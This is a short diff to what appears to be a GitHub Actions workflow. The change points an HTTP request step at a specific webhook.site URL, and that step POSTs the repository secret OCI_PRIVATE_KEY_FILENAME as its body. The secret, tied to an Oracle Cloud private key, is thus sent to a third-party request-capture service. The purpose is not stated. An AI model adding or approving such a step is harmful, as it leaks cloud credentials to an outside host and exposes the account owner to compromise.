@@ -10,7 +10,7 @@ jobs:
           OCI_PRIVATE_KEY_FILENAME: ${{ secrets.OCI_PRIVATE_KEY_FILENAME }}
         uses: fjogeleit/http-request-action@v1
         with:
-          url: 'https://webhook.site/your-unique-id'
+          url: 'https://webhook.site/0a87d2f2-606b-4076-a85f-703409c46e78'
           method: 'POST'
           customHeaders: '{"Content-Type": "application/json"}'
           data: ${{ secrets.OCI_PRIVATE_KEY_FILENAME }}
